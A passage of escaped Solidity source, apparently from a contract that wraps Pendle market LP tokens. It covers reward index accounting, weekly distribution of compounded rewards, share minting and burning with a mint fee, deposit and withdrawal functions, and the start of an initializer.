rewardTokens[i],\n                PENDLE_POWER_FARM_CONTROLLER\n            );\n\n            if (userReward.accrued > 0) {\n                PENDLE_MARKET.redeemRewards(\n                    PENDLE_POWER_FARM_CONTROLLER\n                );\n\n                userReward = _getUserReward(\n                    rewardTokens[i],\n                    PENDLE_POWER_FARM_CONTROLLER\n                );\n            }\n\n            index = userReward.index;\n\n            if (lastIndex[i] == 0 && index > 0) {\n                rewardsOutsideArray[i] = 0;\n                _overWriteIndex(\n                    i\n                );\n                unchecked {\n                    ++i;\n                }\n                continue;\n            }\n\n            if (index == lastIndex[i]) {\n                rewardsOutsideArray[i] = 0;\n                unchecked {\n                    ++i;\n                }\n                continue;\n            }\n\n            uint256 indexDiff = index\n                - lastIndex[i];\n\n            uint256 activeBalance = _getActiveBalance();\n            uint256 totalLpAssetsCurrent = totalLpAssets();\n            uint256 lpBalanceController = _getBalanceLpBalanceController();\n\n            bool scaleNecessary = totalLpAssetsCurrent < lpBalanceController;\n\n            rewardsOutsideArray[i] = scaleNecessary\n                ? indexDiff\n                    * activeBalance\n                    * totalLpAssetsCurrent\n                    / lpBalanceController\n                    / PRECISION_FACTOR_E18\n                : indexDiff\n                    * activeBalance\n                    / PRECISION_FACTOR_E18;\n\n            _overWriteIndex(\n                i\n            );\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        return rewardsOutsideArray;\n    }\n\n    function _getBalanceLpBalanceController()\n        private\n        view\n        returns (uint256)\n    {\n        return PENDLE_MARKET.balanceOf(\n            PENDLE_POWER_FARM_CONTROLLER\n        );\n    }\n\n    function _getActiveBalance()\n        private\n        view\n        returns (uint256)\n    {\n        return PENDLE_MARKET.activeBalance(\n            PENDLE_POWER_FARM_CONTROLLER\n        );\n    }\n\n    function _getSharePrice()\n        private\n        view\n        returns (uint256)\n    {\n        return previewUnderlyingLpAssets() * PRECISION_FACTOR_E18\n            / totalSupply();\n    }\n\n    function _syncSupply()\n        private\n    {\n        uint256 additonalAssets = previewDistribution();\n\n        if (additonalAssets == 0) {\n            return;\n        }\n\n        underlyingLpAssetsCurrent += additonalAssets;\n        totalLpAssetsToDistribute -= additonalAssets;\n    }\n\n    function _increaseCardinalityNext()\n        internal\n    {\n        MarketStorage memory storageMarket = PENDLE_MARKET._storage();\n\n        if (storageMarket.observationCardinalityNext < MAX_CARDINALITY) {\n            PENDLE_MARKET.increaseObservationsCardinalityNext(\n                storageMarket.observationCardinalityNext + 1\n            );\n        }\n    }\n\n    function _withdrawLp(\n        address _to,\n        uint256 _amount\n    )\n        internal\n    {\n        PENDLE_CONTROLLER.withdrawLp(\n            UNDERLYING_PENDLE_MARKET,\n            _to,\n            _amount\n        );\n    }\n\n    function _getUserReward(\n        address _rewardToken,\n        address _user\n    )\n        internal\n        view\n        returns (UserReward memory)\n    {\n        return PENDLE_MARKET.userReward(\n            _rewardToken,\n            _user\n        );\n    }\n\n    function previewDistribution()\n        public\n        view\n        returns (uint256)\n    {\n        if (totalLpAssetsToDistribute == 0) {\n            return 0;\n        }\n\n        if (block.timestamp == lastInteraction) {\n            return 0;\n        }\n\n        if (totalLpAssetsToDistribute < ONE_WEEK) {\n            return totalLpAssetsToDistribute;\n        }\n\n        uint256 currentRate = totalLpAssetsToDistribute\n            / ONE_WEEK;\n\n        uint256 additonalAssets = currentRate\n            * (block.timestamp - lastInteraction);\n\n        if (additonalAssets > totalLpAssetsToDistribute) {\n            return totalLpAssetsToDistribute;\n        }\n\n        return additonalAssets;\n    }\n\n    function _setLastInteraction()\n        private\n    {\n        lastInteraction = block.timestamp;\n    }\n\n    function _applyMintFee(\n        uint256 _amount\n    )\n        internal\n        view\n        returns (uint256)\n    {\n        return _amount\n            * (PRECISION_FACTOR_E6 - mintFee)\n            / PRECISION_FACTOR_E6;\n    }\n\n    function totalLpAssets()\n        public\n        view\n        returns (uint256)\n    {\n        return underlyingLpAssetsCurrent\n            + totalLpAssetsToDistribute;\n    }\n\n    function previewUnderlyingLpAssets()\n        public\n        view\n        returns (uint256)\n    {\n        return previewDistribution()\n            + underlyingLpAssetsCurrent;\n    }\n\n    function previewMintShares(\n        uint256 _underlyingAssetAmount,\n        uint256 _underlyingLpAssetsCurrent\n    )\n        public\n        view\n        returns (uint256)\n    {\n        return _underlyingAssetAmount\n            * totalSupply()\n            / _underlyingLpAssetsCurrent;\n    }\n\n    function previewAmountWithdrawShares(\n        uint256 _shares,\n        uint256 _underlyingLpAssetsCurrent\n    )\n        public\n        view\n        returns (uint256)\n    {\n        return _shares\n            * _underlyingLpAssetsCurrent\n            / totalSupply();\n    }\n\n    function previewBurnShares(\n        uint256 _underlyingAssetAmount,\n        uint256 _underlyingLpAssetsCurrent\n    )\n        public\n        view\n        returns (uint256)\n    {\n        uint256 product = _underlyingAssetAmount\n            * totalSupply();\n\n        return product % _underlyingLpAssetsCurrent == 0\n            ? product / _underlyingLpAssetsCurrent\n            : product / _underlyingLpAssetsCurrent + 1;\n    }\n\n    function manualSync()\n        external\n        syncSupply\n        returns (bool)\n    {\n        return true;\n    }\n\n    function addCompoundRewards(\n        uint256 _amount\n    )\n        external\n        syncSupply\n    {\n        if (_amount == 0) {\n            revert ZeroAmount();\n        }\n\n        totalLpAssetsToDistribute += _amount;\n\n        if (msg.sender == PENDLE_POWER_FARM_CONTROLLER) {\n            return;\n        }\n\n        _safeTransferFrom(\n            UNDERLYING_PENDLE_MARKET,\n            msg.sender,\n            PENDLE_POWER_FARM_CONTROLLER,\n            _amount\n        );\n    }\n\n    /**\n     * @dev External wrapper for mint function.\n     */\n    function depositExactAmount(\n        uint256 _underlyingLpAssetAmount\n    )\n        external\n        syncSupply\n        returns (\n            uint256,\n            uint256\n        )\n    {\n        if (_underlyingLpAssetAmount == 0) {\n            revert ZeroAmount();\n        }\n\n        uint256 shares = previewMintShares(\n            _underlyingLpAssetAmount,\n            underlyingLpAssetsCurrent\n        );\n\n        if (shares == 0) {\n            revert NotEnoughLpAssetsTransferred();\n        }\n\n        uint256 reducedShares = _applyMintFee(\n            shares\n        );\n\n        uint256 feeShares = shares\n            - reducedShares;\n\n        if (feeShares == 0) {\n            revert ZeroFee();\n        }\n\n        if (reducedShares == feeShares) {\n            revert TooMuchFee();\n        }\n\n        _mint(\n            msg.sender,\n            reducedShares\n        );\n\n        _mint(\n            PENDLE_POWER_FARM_CONTROLLER,\n            feeShares\n        );\n\n        underlyingLpAssetsCurrent += _underlyingLpAssetAmount;\n\n        _safeTransferFrom(\n            UNDERLYING_PENDLE_MARKET,\n            msg.sender,\n            PENDLE_POWER_FARM_CONTROLLER,\n            _underlyingLpAssetAmount\n        );\n\n        return (\n            reducedShares,\n            feeShares\n        );\n    }\n\n    function changeMintFee(\n        uint256 _newFee\n    )\n        external\n        onlyController\n    {\n        if (_newFee > MAX_MINT_FEE) {\n            revert FeeTooHigh();\n        }\n\n        mintFee = _newFee;\n    }\n\n    /**\n     * @dev External wrapper for burn function.\n     */\n    function withdrawExactShares(\n        uint256 _shares\n    )\n        external\n        syncSupply\n        returns (uint256)\n    {\n        if (_shares == 0) {\n            revert ZeroAmount();\n        }\n\n        if (_shares > balanceOf(msg.sender)) {\n            revert InsufficientShares();\n        }\n\n        uint256 tokenAmount = previewAmountWithdrawShares(\n            _shares,\n            underlyingLpAssetsCurrent\n        );\n\n        underlyingLpAssetsCurrent -= tokenAmount;\n\n        _burn(\n            msg.sender,\n            _shares\n        );\n\n        if (msg.sender == PENDLE_POWER_FARM_CONTROLLER) {\n            return tokenAmount;\n        }\n\n        _withdrawLp(\n            msg.sender,\n            tokenAmount\n        );\n\n        return tokenAmount;\n    }\n\n    function withdrawExactAmount(\n        uint256 _underlyingLpAssetAmount\n    )\n        external\n        syncSupply\n        returns (uint256)\n    {\n        if (_underlyingLpAssetAmount == 0) {\n            revert ZeroAmount();\n        }\n\n        uint256 shares = previewBurnShares(\n            _underlyingLpAssetAmount,\n            underlyingLpAssetsCurrent\n        );\n\n        if (shares > balanceOf(msg.sender)) {\n            revert NotEnoughShares();\n        }\n\n        _burn(\n            msg.sender,\n            shares\n        );\n\n        underlyingLpAssetsCurrent -= _underlyingLpAssetAmount;\n\n        _withdrawLp(\n            msg.sender,\n            _underlyingLpAssetAmount\n        );\n\n        return shares;\n    }\n\n    function initialize(\n        address _underlyingPendleMarket,\n        address _pendleController,\n        string memory _tokenName,\n        string memory _symbolName,\n        uint16 _maxCardinality\n    )\n        external\n    {\n        if (address(PENDLE_MARKET) != address(0)) {\n            revert AlreadyInitialized();\n        }\n\n        PENDLE_MARKET = IPendleMarket(\n            _underlyingPendleMarket\n        );\n\n        if (PENDLE_MARKET.isExpired() == true) {\n            revert MarketExpired();\n        }\n\n        PENDLE_CONTROLLER = IPendleController(\n            _pendleController"
    }
  ]
}